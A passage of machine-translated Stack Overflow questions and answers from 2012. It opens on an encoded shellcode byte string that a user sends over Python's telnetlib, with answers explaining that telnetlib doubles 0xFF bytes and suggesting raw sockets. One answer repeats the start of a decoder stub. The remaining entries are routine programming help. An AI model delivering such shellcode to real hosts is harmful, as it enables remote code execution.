        "\x4c\x4c\x4b\x45\x51\x7a\x4b\x6c\x49\x73\x6c\x56\x44\x65\x54\x5a"
        "\x63\x50\x31\x69\x50\x61\x74\x6c\x4b\x67\x30\x64\x70\x6b\x35\x4f"
        "\x30\x72\x58\x34\x4c\x4c\x4b\x71\x50\x44\x4c\x4c\x4b\x72\x50\x55"
        "\x4c\x4c\x6d\x4e\x6b\x73\x58\x53\x38\x68\x6b\x36\x69\x4e\x6b\x6b"
        "\x30\x78\x30\x55\x50\x75\x50\x55\x50\x6c\x4b\x52\x48\x57\x4c\x41"
        "\x4f\x47\x41\x4a\x56\x71\x70\x76\x36\x6d\x59\x69\x68\x4d\x53\x6b"
        "\x70\x33\x4b\x52\x70\x30\x68\x68\x70\x6d\x5a\x74\x44\x33\x6f\x70"
        "\x68\x6d\x48\x6b\x4e\x6f\x7a\x64\x4e\x41\x47\x4b\x4f\x4b\x57\x42"
        "\x43\x70\x6d\x63\x54\x36\x4e\x71\x75\x61\x68\x30\x65\x65\x70\x64"
        "\x6f\x31\x73\x71\x30\x62\x4e\x42\x45\x52\x54\x61\x30\x53\x45\x71"
        "\x63\x75\x35\x30\x72\x37\x50\x72\x48\x50\x61\x62\x43\x52\x4b\x41"
        "\x30\x75\x38\x43\x51\x45\x33\x70\x6b\x45\x70\x54\x6f\x72\x61\x42"
        "\x64\x61\x54\x71\x30\x46\x46\x55\x76\x41\x30\x30\x6e\x61\x75\x71"
        "\x64\x41\x30\x32\x4c\x52\x4f\x41\x73\x73\x51\x52\x4c\x43\x57\x54"
        "\x32\x52\x4f\x62\x55\x44\x30\x67\x50\x53\x71\x33\x54\x62\x4d\x61"
        "\x79\x42\x4e\x42\x49\x51\x63\x62\x54\x32\x52\x70\x61\x74\x34\x42"
        "\x4f\x61\x62\x31\x63\x31\x30\x61\x78\x33\x51\x31\x73\x50\x6b\x65"
        "\x70\x46\x4f\x63\x71\x61\x54\x61\x54\x63\x30\x6a"; 
```

![在此处输入图像描述](../Images/3f8d4364077ad0265874c8cdc5d794ab.png)

哦，我差不多明白了。00AEFD70这么多FF。为什么？

我用 C++ 编写了相同的功能代码。一切正常。这是比较。

![在此处输入图像描述](../Images/fef460dcdf2a65e9a80041a7daeb1804.png) 换句话说，这是怎么回事？

![在此处输入图像描述](../Images/9d6efc6ac8572494adf9ab1d9f56b084.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-30T00:28:46.967

[telnet lib 文档](http://docs.python.org/2/library/telnetlib.html#telnetlib.Telnet.write)表明（强调我的）：

> 将字符串写入套接字，**将任何 IAC 字符加倍。**如果连接被阻止，这可能会阻止。如果连接关闭，可能会引发 socket.error。

IAC 字符恰好是 ASCII 255，即`'\xff'`.

如果你比较你的两个转储：IAC char`FF`在 python 版本中加倍，但在 C 版本中没有，它使用原始套接字，你也可以在 Python 中使用`socket`模块来做到这一点。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-29T16:41:22.047

您的使用`bytearray`可能是更改 shellcode，尝试在没有`bytearray`函数的情况下定义 shellcode。例如：

```
shellcode = (
        "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
        "\x49\x49\x49\x49\x48\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x6a\x6a"
        "\x58\x50\x30\x42\x31\x41\x42\x6b\x42\x41\x7a\x32\x42\x42\x42\x32"
        ...
        ...
) 
```

# typo3 - colPos TYPO3 过滤结果

> ID：13125652
> 
> 赞同：0
> 
> 时间：2012-10-29T16:23:35.283
> 
> 标签：typo3

我们为 TYPO3 创建了一个扩展，但我们希望在列中显示不同的结果（左右正常等）。

我们让它按页面 ID 过滤。但它们都显示了整个页面的结果，而不仅仅是它正在加载的列。

如何通过 colPos 过滤结果（在 tt_content 中找到）。

```
<?php
$pri = $GLOBALS['TYPO3_DB']->exec_SELECTgetRows('tx_extendttcontent_pid_banner','tt_content','pid = "'.$activePage.'" AND deleted = 0 AND hidden = 0');
?> 
```

我们通过 $GLOBAL['TSFE']->id 获得 activePage；

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-30T11:54:32.607

这有点复杂，因为它取决于您的扩展程序的结构。但是，在扩展类的扩展的主类中`tslib_pibase`，您应该在`$this->cObj->data`数组中拥有可用的插件数据。因此，这样的事情应该有效：

```
<?php
    $colPos = $this->cObj->data['colPos'];
    $pri = $GLOBALS['TYPO3_DB']->exec_SELECTgetRows('tx_extendttcontent_pid_banner','tt_content','pid = "'.$activePage.'" colPos='.$colPos.' AND deleted = 0 AND hidden = 0');
?> 
```

**注意**：SQL 查询不考虑访问数据。至少你应该包括一个检查`starttime`，`endtime`这样你就不会加载不应该显示的内容。如果您正在编写将具有全局使用的扩展，您可能应该以不同的方式加载内容，以便甚至考虑 FE 用户访问权限。

# model-view-controller - JavaFX 2 中自定义组件类之间通信的正确 MVC 方法

> ID：13125653
> 
> 赞同：2
> 
> 时间：2012-10-29T16:23:35.347
> 
> 标签：model-view-controller, javafx-2, fxml, scenebuilder

我有一个`JavaFX-2`用该语言编写的自定义组件`fxml`（我将其称为子级或子级），我用它`JavaFX Scene Builder`来创建它。我的一个视图类需要显示几个（~100）这些组件并与它们通信。考虑到`MVC`架构，最好的沟通方式是什么？

1.  （容器）模型 -> （儿童）模型
2.  （容器）控制器 -> （儿童）控制器
3.  （容器）控制器 -> （儿童）模型

基本上，我至少需要能够监视子 UI 和/或容器对象中发生的两种事件。

**案例 1**：用户单击了我的自定义组件（子组件）中存在的按钮（或与另一个对象交互），容器必须就更改进行通信。

**案例 2**：用户在容器上触发了一个事件，例如基于特定查询过滤组件，我需要与孩子们沟通这个变化。

提前感谢所有帮助。干杯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-01T10:37:44.227

我总是倾向于保持控制器之间的通信，而我的模型是 POJO，尽管它们使用 javafx 属性来存储数据。这似乎映射到选项#2。

父控制器调用子控制器相当容易，它所要做的就是加载它们并将它们保存在一个列表中。调用父母的孩子有点丑陋，因为它可能需要对父母的引用。我尝试通过在父级添加侦听器的子控制器上具有事件处理程序属性来避免这种情况。这使我的孩子控件非常可重复使用。

# css - 当 mixin 函数是参数时，如何在 Stylus 中进行透明的供应商混合？

> ID：13125656
> 
> 赞同：2
> 
> 时间：2012-10-29T16:23:42.783
> 
> 标签：css, node.js, stylus

为类似的属性制作 mixin`border-radius`很容易：

```
vendor(name, args)
    -webkit-{name} args
    -moz-{name} args
    -ie-{name} args
    -o-{name} args
    {name} args

border-radius()
    vendor('border-radius', arguments)

#test
    border-radius 5px 
```

但是，如果我想创建一个透明的供应商 mixin`linear-gradient`怎么办？不像`border-radius`,`linear-gradient`不是属性而是参数，例如

```
#test
    background-image linear-gradient(top, #f00 0%, #00f 100%) 
```

我想我必须创建一个名为 mixin`background-image`并检查第一个参数是否为`linear-gradient`. Stylus 能做到如此高级的逻辑吗？如果是这样，我怎样才能完成我想做的事情？

感谢您对此事的任何帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T20:49:11.290

你熟悉 nib 项目吗？[http://visionmedia.github.com/nib/](http://visionmedia.github.com/nib/)它有你想要的手写笔的所有mixin。即使您最终没有使用 nib，您仍然可以查看他们的代码（[https://github.com/visionmedia/nib/blob/master/lib/nib/gradients.styl#L106](https://github.com/visionmedia/nib/blob/master/lib/nib/gradients.styl#L106)用于线性渐变）

# objective-c - sizeof 在 iPad 1 上崩溃但不是 > iPad 1

> ID：13125657
> 
> 赞同：1
> 
> 时间：2012-10-29T16:23:44.140
> 
> 标签：objective-c, ios, c

考虑这段代码：

```
CGFloat largerLineSpacing = kStreamCellParagraphSpacing;

CTParagraphStyleSetting paragraphSettings[1] = {
    { kCTParagraphStyleSpecifierParagraphSpacing, sizeof(CGFloat), &largerLineSpacing }
};
CTParagraphStyleRef paragraphStyle = CTParagraphStyleCreate(paragraphSettings, sizeof(*paragraphSettings)); 
```

此代码在 iPad 1 (5.1) 上运行时崩溃并出现 EXC_BAD_ACCESS，但在 5.1 模拟器或 iPad 3 (6.0) 上运行时不会。我的 C 很弱 - 我在 sizeof 上犯了一个愚蠢的错误吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T16:28:54.003

[CTParagraphStyleCreate](http://developer.apple.com/library/mac/#documentation/Carbon/Reference/CTParagraphStyleRef/Reference/reference.html)的文档建议它的第二个参数给出数组中的`CTParagraphStyleSetting`实例数`paragraphSettings`（在您的情况下为 1），而不是数组的字节大小。

如果您将代码更改为

```
CTParagraphStyleRef paragraphStyle = CTParagraphStyleCreate(paragraphSettings, 1); 
```

它应该工作。或者，如果您想应对将来添加更多设置，您可以尝试

```
int numElems = sizeof(paragraphSettings)/sizeof(paragraphSettings[0]);
CTParagraphStyleRef paragraphStyle = CTParagraphStyleCreate(paragraphSettings,
                                                            numElems); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-29T16:32:06.677

静态 CFIndex 常量 settingCount = 1;

```
CTParagraphStyleSetting paragraphSettings[settingCount] = {
    { kCTParagraphStyleSpecifierParagraphSpacing, sizeof(CGFloat), &largerLineSpacing }
};

CTParagraphStyleRef paragraphStyle = CTParagraphStyleCreate(paragraphSettings, settingCount); 
```

# c++ - 编译失败，将静态变量作为私有成员变量的 c++ 程序

> ID：13125662
> 
> 赞同：1
> 
> 时间：2012-10-29T16:23:50.690
> 
> 标签：c++, gcc, ubuntu, static-members

> **可能重复：**
> [对静态成员变量](https://stackoverflow.com/questions/2916759/undefined-reference-to-static-member-variable)
> [的未定义引用什么是未定义引用/未解决的外部符号错误，我该如何解决？](https://stackoverflow.com/questions/12573816/what-is-an-undefined-reference-unresolved-external-symbol-error-and-how-do-i-fix)

```
#include<iostream>
using namespace std;

class abc {

    private:
    static int a ;

    public:

    abc(int x) {
        a = x;
    }

    void showData() {
        cout<<"A = "<<a<<endl;
    }
};

int main() {
    abc a1(4);
    abc a2(5);

    a1.showData();
    a2.showData();

    return 0;
} 
```

当我尝试在 Ubuntu 上使用 GCC 编译器编译这个函数时。我收到以下错误。

```
/tmp/ccCKK2YN.o: In function `main':
static1.cpp:(.text+0xb): undefined reference to `Something::s_nValue'
static1.cpp:(.text+0x14): undefined reference to `Something::s_nValue'
collect2: ld returned 1 exit status
Compilation failed. 
```

以下代码运行良好

```
#include<iostream>
using namespace std;

class Something
{
public:
    static int s_nValue;
};

int Something::s_nValue = 1;

int main()
{
    Something cFirst;
    cFirst.s_nValue = 2;

    Something cSecond;
    std::cout << cSecond.s_nValue;

    return 0;
} 
```

这是因为静态成员变量需要在通过对象访问它们之前显式初始化。为什么会这样？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:30:14.090

`static int s_nValue;`不分配任何存储来存储 int，它只是声明它。

您在内存中分配某个位置来存储变量：

```
int Something::a=0; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T16:30:04.010

[在类的成员列表中声明静态数据成员不是定义。您必须在命名空间范围内的类声明之外定义静态成员。](http://publib.boulder.ibm.com/infocenter/comphelp/v8v101/index.jsp?topic=%2Fcom.ibm.xlcpp8a.doc%2Flanguage%2Fref%2Fcplr038.htm)

看到[这个线程](https://stackoverflow.com/questions/185844/initializing-private-static-members)。

简而言之，静态成员需要在`.cpp`文件的某处进行初始化，以便编译器为其分配空间。声明如下所示：

```
int abc::a = 0; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-29T16:31:19.690

这是因为静态成员在类的所有实例之间共享，因此需要在一个地方声明它们。

如果您在类声明中定义静态变量，那么`include`该文件的每个变量都会对该变量进行定义（这与`static`含义相反）。

因此，您必须在`.cpp`.

# javascript - 显示标题和图像滑块

> ID：13125664
> 
> 赞同：1
> 
> 时间：2012-10-29T16:23:57.140
> 
> 标签：javascript, html, css, slider, caption

我使用 Dynamic Drive 中的 motiongallery.js（CMotion Image Gallery）创建了这个[滑块。](http://www.lifewelllived.co.uk/example/version1/index.html)

我正在尝试使用 jQuery Capty 将 alt 或标题文本设置为标题，但是它不能正确显示（请参见[此处](http://www.lifewelllived.co.uk/example/version2/index.html)）。

有没有人对如何使这项工作有任何提示或建议？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T17:03:11.233

将以下类添加到您的 CSS 文件中。那必须解决整个问题。

`.capty-wrapper{display:inline-block;}`

问题是`<a>`并且`<img>`是内联元素。Capty 使用`<div>`s 来渲染其标题，这是一个块元素，会打乱画廊的布局。

上面的 CSS 使包含 capty 的 div 成为一个内联元素。

还要考虑 Billy Moat 的评论和 `$('.caption').capty();` 用于向图像元素添加标题的用途，因为 id 应该是唯一的。

# c - 单个字符的strtok

> ID：13125672
> 
> 赞同：3
> 
> 时间：2012-10-29T16:24:33.113
> 
> 标签：c

我必须用这种格式标记一个字符串：

```
 pippo:c:C2,C3,C4:pippo 
```

如何使用 strtok 标记这个字符串（一旦我完成了标记，我就不需要这个字符串了）。我希望将单独的字符存储到 char 变量中，而不是 char* 变量中。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-29T16:30:52.487

如果您只想要 :c: 部分中的 c，并且您知道事物将具有这种格式，那么您不必进行标记化。你可以简单地做

```
char c = strchr(str, ':')[1]; 
```

这将定位第一个 :，并获取它后面的字符。当然，strtok 也可以：

```
strtok(str, ":");
char c = strtok(NULL, ":")[0]; 
```

这将获取第二个标记化的单词，并获取该单词的第一个字符。一般来说，如果您想要更深入的内容，您可能希望使用循环来代替。与其他情况不同，在这种情况下并不是说 str 缓冲区必须是可写的。

最后，如果`pippo`部分始终具有相同的长度，您可以简单地逃脱

```
char c = str[6]; 
```

在所有情况下，`str = "pippo:c:C2,C3,C4:pippo"`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T16:35:00.390

如果您想使用两个标记之间的单个字符，`strtok()`您可以通过检查您提取的字符串长度来实现。

```
int main ()
{
    char str[] ="pippo:c:C2,C3,C4:pippo";
    char * pch;
    char winner;

    pch = strtok (str,":"); 
    while (pch != NULL)
    {
      if(strlen(pch) == 1){   // if there's only 1 char we got it
        winner = pch[0];      // if there's more than 1 single char of :x: format you
        break;                // could check for that too here.
      }
      pch = strtok (NULL, ":");
    }

    printf("And the winner is: %c\n", winner);
    return 0;
} 
```

# doctrine-orm - Doctrine 2 DBAL 仅返回字符串数据类型

> ID：13125681
> 
> 赞同：3
> 
> 时间：2012-10-29T16:24:54.620
> 
> 标签：doctrine-orm, silex, dbal

我正在使用 Silex 微框架构建一个简单的 REST 后端。

在每个控制器内部，我正在对 MySQL 数据库运行一些查询（使用 Doctrine 2 DBAL API），如下所示：

```
$app->get('/customers', function (Application $app) {
    $recordset = $app['db']->fetchAll('SELECT id, name FROM Customers');
    return $app->json($recordset);
}); 
```

任何人都可以向我解释为什么 Doctrine DBAL 只返回`string`数据类型，而不管列定义吗？下面是使用 PHP 函数的相应输出`var_dump($recordset)`（注意`id`字段应该是整数类型，而不是字符串）：

```
array(1) {
  [0]=>
  array(2) {
    ["id"]=>
    string(5) "10043"
    ["name"]=>
    string(20) "Hey, I'm just a test"
  }
} 
```

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-06T08:19:51.680

正如 Maerlyn 所建议的，这似乎是 PDO 驱动程序的一个已知问题，因此也是 Doctrine DBAL 的一个已知问题。

在不使用 Doctrine 2 ORM 层提供的映射能力的情况下，我发现[这个](https://stackoverflow.com/a/11494408/1540486)答案是 DBAL 限制的一种可能的解决方法。

# .net - StoryBoard DoubleAnimation 巨大的 CPU 使用率

> ID：13125682
> 
> 赞同：0
> 
> 时间：2012-10-29T16:25:02.370
> 
> 标签：.net, wpf, .net-3.5

在 StoryBoard 中有带有 DoubleAnimation 的 TextBlock。
在 Windows 7 上 -一直**1-2%**的 CPU 使用率。
在 Windows XP SP3 上 - **10-15%**的 CPU 使用率。

```
<TextBlock Grid.Column="1" Height="Auto" Margin="10,0,0,0" TextWrapping="Wrap" HorizontalAlignment="Left" VerticalAlignment="Center" PreviewMouseDown="incomMessages_SelectionChanged">
     <TextBlock.Text>
          <Binding Mode="OneTime" Converter="{StaticResource Converter}" ConverterParameter="NameAndId"/>
     </TextBlock.Text>
     <TextBlock.Style>
          <Style>    
               <Style.Triggers>
                    <DataTrigger Binding="{Binding IsNew}" Value="True">
                         <DataTrigger.EnterActions>
                              <BeginStoryboard Name="Blink">
                                   <Storyboard BeginTime="00:00:01" RepeatBehavior="Forever">
                                        <DoubleAnimation Storyboard.TargetProperty="(TextBlock.Opacity)" From="0" To="1" Duration="0:0:1" RepeatBehavior="Forever" AutoReverse="True"/>
                                    </Storyboard>
                               </BeginStoryboard>
                          </DataTrigger.EnterActions>
                     </DataTrigger>
                </Style.Triggers>
           </Style>
     </TextBlock.Style>
</TextBlock> 
```

我做错了什么还是WPF功能？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-30T08:04:27.330

您可以检查[RenderCapability.Tier](http://msdn.microsoft.com/en-us/library/system.windows.media.rendercapability.tier.aspx)属性。它指示当前线程的渲染层

> `RenderCapability.Tier = 0`表示设备上的应用程序没有可用的图形硬件加速。所有图形功能都使用软件加速。

如果`RenderCapability.Tier`为 0，您可以更改[Storyboard.DesiredFrameRate](http://msdn.microsoft.com/en-us/library/system.windows.media.animation.timeline.desiredframerate.aspx)属性。默认值为 60，但在 Windows XP 上您可以将其设置得更低。

怎么做你可以看看[这里](http://blogs.msdn.com/b/henryh/archive/2006/08/23/719568.aspx)

# mysql - 合并具有唯一性约束的行

> ID：13125685
> 
> 赞同：0
> 
> 时间：2012-10-29T16:25:12.030
> 
> 标签：mysql, sql, ruby-on-rails-3

我有一个小的时间跟踪网络应用程序（在 Rails 3.2.8 和 MySQL 中实现）。该应用程序有几个用户在给定日期将时间添加到特定任务中。系统设置为每个日期每个任务用户只能有 1 个时间条目（即行）。即，如果您在同一任务和日期上添加两次时间，它将向现有行添加时间，而不是创建新行。`user_id/task_id/date`唯一性由索引强制执行`UNIQUE`。

现在我正在寻找合并 2 个任务。用最简单的术语来说，将任务 ID 2 合并到任务 ID 1 将采用此

```
time  | user_id  | task_id  | date
------+----------+----------+-----------
10    | 1        | 1        | 2012-10-29
15    | 2        | 1        | 2012-10-29
10    | 1        | 2        | 2012-10-29
5     | 3        | 2        | 2012-10-29 
```

并将其更改为

```
time  | user_id  | task_id  | date
------+----------+----------+-----------
20    | 1        | 1        | 2012-10-29 <-- time values merged (summed)
15    | 2        | 1        | 2012-10-29 <-- no change
5     | 3        | 1        | 2012-10-29 <-- task_id changed (no merging necessary) 
```

即通过对时间值求和来合并，其中给定的 user_id/date/task 组合会发生冲突。

`ON DUPLICATE KEY UPDATE ...`我想如果我为每个 task_id=2 条目进行插入，我可以使用唯一约束来执行。但这似乎很不雅。

我还试图找到一种方法，首先使用汇总时间更新任务 1 中的所有行，但我无法完全弄清楚这一点。

有任何想法吗？

* * *

**更新：**离开奥拉夫的回答，我想出了这个，这似乎正在工作

```
INSERT INTO `timetable`
(`time`, `user_id`, `task_id`, `date`)
(
    SELECT
      SUM(`time`) AS `time`,
      `user_id`,
      1 AS `task_id`,
      `date`
    FROM `timetable` AS `t1`
    WHERE `task_id` IN (1,2)
    GROUP BY `user_id`, `date`
)
ON DUPLICATE KEY UPDATE `time`=VALUES(`time`);

DELETE FROM `timetable` WHERE `task_id`=2; 
```

如果有人有更好的解决方案（或者我的解决方案中有任何我应该知道的问题），我会留下这个问题

**更新2：**不知道为什么我之前没有意识到这一点，但是我的解决方案可能会做很多多余的INSERT，因为它还会找到所有只存在于目标任务中并且不需要合并的条目。在上面的示例数据中，将找到第二行，重新插入，触发重复键，并将时间设置为与现在相同。因此，如果目标任务有 10 行，源任务有 0 行，它仍然会执行 10 次（完全没有意义的）INSERT。

这可以通过将内部 SELECT 的所有内容包装在另一个 SELECT 中来避免，并用于`COUNT(*)`仅查找需要合并的那些行。当然，这将需要另一个更多的查询来更新那些不需要合并的行的 task_id *（*据我所知，这需要一个连接来弄清楚）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T16:52:20.590

总结`user_id`和`date`将是：

```
select sum(time), user_id, 1, date
from timetable
group by user_id, date; 
```

更新时间表（感谢@Flambino）：

```
insert into timetable (time, user_id, task_id, date)
    select sum(time), user_id, 1, date
    from timetable
    group by user_id, date
on duplicate key update time = values(time); 
```

最后删除所有`task_id`非 1 的行：

```
delete from timetable where task_id > 1; 
```

当更新仅限于任务 1 和 2 时，像 @Flambino 的更新一样应用 where 子句。

# javascript - 使用 jQuery 实现书签/标志

> ID：13125688
> 
> 赞同：0
> 
> 时间：2012-10-29T16:25:38.163
> 
> 标签：javascript, jquery

我正在尝试在我的页面中实现书签功能。想象一个项目列表，每个项目都有一个标志。您可以单击该标志以突出显示您的选择，然后再次单击它以取消选择。

在这里，flags 是`div`保存书签/标志图标的类。我正在使用 data-flag 属性来跟踪书签/标志的当前状态。每当我单击该标志时，我都可以将`data-flag`属性更改为`1`，但是再次单击它时，它不会将`data-flag`属性重置为`0`，而是保持原样`1`并在现有图像之外附加另一个图像。

```
$(".flags").each(function(){
    var $this = $(this);
    $this.click(function() {
        var flagtest = $this.data("flag");
            if(flagtest == 0){
                $this.attr("data-flag","1");
                $this.append("<img class='image' src='icon_dark.png'height=8px/>");
            } else if(flagtest == 1){
                $this.attr("data-flag","0");
                $this.append("<img class='image' src='icon_light.png'height=8px/>");
            }
        });
}); 
```

任何人都可以在这里看到问题吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-29T16:30:07.600

在数据属性中使用 true/false 会更容易，而且您只是在图像后附加图像，您还必须删除它们：

```
$(".flags").each(function(idx,elm){
    $(elm).data('flag', false).on('click', function() {
        var flag = $(this).data("flag");
        if (flag) {
            $(this).html("<img class='image' src='icon_dark.png'height=8px/>");
        } else {
            $(this).html("<img class='image' src='icon_light.png'height=8px/>");
        }
        $(this).data("flag", !flag); //toggle state
    });
});​ 
```

更简洁的方法是检查图像是否存在，如果存在则更改源：

```
$(".flags").each(function(idx,elm){
    $(elm).data('flag', false).on('click', function() {
        var flag = $(this).data("flag"),
            hasImg = $(this).find('.image').length,
            imgSrc = flag ? 'icon_dark.png' : 'icon_light.png';

        if (hasImg) {
            $('.image', this).attr('src', imgSrc);
        }else{
            var element = $('<img />', {src: imgSrc, 'class':'image', height:'8px'});
            $(this).append(element);
        }

        $(this).data("flag", !flag); //toggle state
    });
});​ 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-29T16:31:00.657

是的。`$this`您在单击处理程序中再次引用。您还附加到 div 而不是更改它。

这就是你想要的：

```
$(".flags").each(function(){
    var $this = $(this);
    $this.click(function() {
        $this = $(this); // added
        var flagtest = $this.data("flag"); 
            if(flagtest == 0){
                $this.attr("data-flag","1");
                $this.html("<img class='image' src='icon_dark.png'height=8px/>");
            } else if(flagtest == 1){
                $this.attr("data-flag","0");
                $this.html("<img class='image' src='icon_light.png'height=8px/>");
            }
        });
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-29T16:32:36.197

您的代码将始终附加一个图像标签。您应该改用一个类来切换图像的样式或直接更改标签的`src`属性。`img`

例如，假设您正在单击图像本身：

```
<img class='flag' src='icon_dark.png' />

$(".flag").click(function() {
  var img = $(this);

  var flagtest = img.data("flag");
  if (flagtest==0) {
    img.attr('src', 'icon_dark.png');
  } else {        
    img.attr('src', 'icon_light.png');
  }

  img.data("flag", !flagtest);
}); 
```

# c# - 按 customAttribute 的值排序对象的属性

> ID：13125689
> 
> 赞同：5
> 
> 时间：2012-10-29T16:25:42.133
> 
> 标签：c#, linq, c#-4.0, reflection, linq-to-objects

我正在尝试做的是 wirte linq 表达式，它允许我`List<PropertyInfo>`通过自定义属性对某些对象进行排序，例如：

```
public class SampleClass{

   [CustomAttribute("MyAttrib1",1)]
   public string Name{ get; set; }
   [CustomAttribute("MyAttrib2",1)]
   public string Desc{get;set;}
   [CustomAttribute("MyAttrib1",2)]
   public int Price{get;set;}
} 
```

自定义属性.cs：

```
public class CustomAttribute: Attribute{
    public string AttribName{get;set;}
    public int Index{get;set;}
    public CustomAttribute(string attribName,int index)
    {
        AttribName = attribName;
        Index = index;
    }
} 
```

到目前为止，我能够从名为 SampleClass 的类中获取所有属性：

```
List<PropertyInfo> propertiesList = new List<PropertyInfo>((IEnumerable<PropertyInfo>)typeof(SampleClass).GetProperties()); 
```

到目前为止，我尝试对此进行排序`propertiesList`（顺便说一句不起作用）：

```
var sortedPropertys = propertiesList
            .OrderByDescending(
                (x, y) => ((CustomAttribute) Attribute.GetCustomAttribute((PropertyInfo) x, typeof (CustomAttribute))).AttribName 
                .CompareTo((((CustomAttribute) Attribute.GetCustomAttribute((PropertyInfo) y, typeof (CustomAttribute))).AttribName ))
            ).OrderByDescending(
                (x,y)=>((CustomAttribute) Attribute.GetCustomAttribute((PropertyInfo) x, typeof (CustomAttribute))).Index
                .CompareTo((((CustomAttribute) Attribute.GetCustomAttribute((PropertyInfo) y, typeof (CustomAttribute))).Index)))
                .Select(x=>x); 
```

**输出列表应该是（我只会用 PropertyInfo.Name 告诉它）：**

```
property name: Name,Price,Desc 
```

我的问题是：**有可能这样做吗？如果是的话，我该如何正确地做到这一点？**

如果您有任何问题，请提出（我会尽力回答每一个不确定性）。我希望对问题的描述就足够了。

感谢提前:)

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-10-29T16:31:16.777

```
var props = typeof(SampleClass)
    .GetProperties()
    .OrderBy(p => p.GetCustomAttributes().OfType<CustomAttribute>().First().AttribName)
    .ThenBy(p => p.GetCustomAttributes().OfType<CustomAttribute>().First().Index)
    .Select(p => p.Name);

var propNames = String.Join(", ", props); 
```

输出：名称、价格、描述

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-04-06T15:11:03.883

我正在阅读这篇文章，因为我想查看 xml 属性并遇到错误，因为通过这个答案，我似乎也得到了我不想要的属性。然后我做了一些看起来很管用的东西，我对自己说有一天它可以帮助别人。

```
IOrderedEnumerable<PropertyInfo> Properties = typeof(FooClass).GetProperties()
                .Where(p => p.CustomAttributes.Any(y => y.AttributeType == typeof(XmlElementAttribute)))
                .OrderBy(g=> g.GetCustomAttributes(false).OfType<XmlElementAttribute>().First().Order); 
```

# c# - 如何在没有 linq 的情况下从数据集中获取数据？

> ID：13125692
> 
> 赞同：0
> 
> 时间：2012-10-29T16:25:53.577
> 
> 标签：c#, .net-2.0, oledb

是否有可能在不使用 LINQ 的情况下从数据集中获取数据？我使用 VS 2005 和 .net 2.0。

```
 string connectionString = String.Format(@"Provider=Microsoft.Jet.OLEDB.4.0;Data Source={0};", _DbFile);

            using (OleDbConnection con = new OleDbConnection(connectionString))
            {
                try
                {
                    con.Open();

                    _Data = new DataSet();

                    OleDbDataAdapter adapter = new OleDbDataAdapter("SELECT * FROM a", con);
                    adapter.Fill(_Data, "a");

                    adapter = new OleDbDataAdapter("SELECT * FROM b", con);
                    adapter.Fill(_Data, "b");

                    // get data...
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-29T16:27:58.927

您可以使用行和列索引来达到单元格值。您还可以使用列名而不是索引。 

```
 if(_Data.Tables.Count > 0 && _Data.Rows.Count > 0 && _Data.Columns.Count > 0)
 {
        string row0col0Data = _Data.Tables[0].Rows[0].Cols[0].ToString();
 } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T16:30:05.413

如果我正确理解您的问题，您正在寻找 Adil 建议的内容，或者使用表名和列名：

```
_Data.Tbales["a"].Rows[i]["columnName"] 
```

# python - 如何在运行过程中获取子进程输出？

> ID：13125696
> 
> 赞同：1
> 
> 时间：2012-10-29T16:26:08.710
> 
> 标签：python, windows, subprocess

我有 2 个文件 main.py 和 infinit.py，如下所示：

主文件

```
#!/usr/bin/python

import logging
import subprocess
import sys

logging.basicConfig(level=logging.INFO)

def forever():
    cmd = [sys.executable, 'infinit.py']
    while 1:
        try:
            print 'running new instance of:'
            print ' '.join(cmd)
            popen = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                stderr=subprocess.PIPE, universal_newlines=True)

            for line in iter(popen.stderr.readline, ""):
                print line,
            for line in iter(popen.stdout.readline, ""):
                print line,

        except Exception as e:
            print 'Something bad happend'
            logging.error(e)

if __name__ == '__main__':
    forever() 
```

无限.py

```
#!/usr/bin/python

import logging

logging.basicConfig(level=logging.INFO)

i = 0
while 1:
    i += 1
    logging.info('i: {0}'.format(i))
    print i 
```

我运行 main.py 并且我想在我的控制台中同时查看（打印和日志记录）。我也希望它在 windows 和 linux 上运行。此外，它是否可以在 Windows Idle 中工作（打印和记录）？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T16:45:39.690

在程序的请求处添加这一行，并放入相同的LOG_FILENAME，然后您可以使用tail -f unix 命令查看输出。

```
import logging
logging.basicConfig(filename=LOG_FILENAME,level=logging.DEBUG, filemode = 'w+')
logging.getLogger().setLevel(logging.DEBUG) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-30T14:04:09.887

我找到了两种解决方案，它们都应该适用于 Linux 和 Windows，甚至适用于 Windows Idle：

1.  更简单的：

在父进程中打印子进程的 stderr：

```
#!/usr/bin/python

import logging
import subprocess
import sys

def forever():
    cmd = [sys.executable, 'infinit.py']
    while 1:
        try:
            print 'running new instance of:'
            print ' '.join(cmd)
            popen = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                stderr=subprocess.PIPE, universal_newlines=True)

            for line in iter(popen.stderr.readline, ""):
                print line,

        except Exception as e:
